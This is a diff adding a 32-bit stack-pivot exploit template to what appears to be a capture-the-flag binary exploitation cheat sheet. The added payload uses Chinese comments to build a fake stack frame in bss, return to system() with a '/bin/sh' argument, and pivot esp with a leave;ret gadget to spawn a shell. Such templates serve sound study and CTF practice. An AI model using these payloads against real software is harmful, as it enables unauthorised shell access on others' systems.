@@ -110,6 +110,20 @@ payload += p64(system)
 s(payload)
 ```
 
+stack mitigation templete
+```python
+
+
+payload = p32(0)                        # 伪造的 old ebp
+payload += p32(system_plt_addr)        # ret 到 system()
+payload += p32(0)                      # 伪造的返回地址 (cincai)
+payload += p32(leak_bss+0x10)          # 参数："/bin/sh" 的地址
+payload += b'/bin/sh\x00'              # 真正写入 "/bin/sh" 字符串
+payload = payload.ljust(offset, b'\x00')  # 填满 overflow 前的部分
+payload += p32(leak_bss)               # 栈迁移：将 esp 指向你构造的 payload（伪造栈帧）区域
+payload += p32(leave_ret)              # 执行栈迁移：leave = mov esp, ebp; pop ebp;  ret
+```
+
 for libc
 ```
 
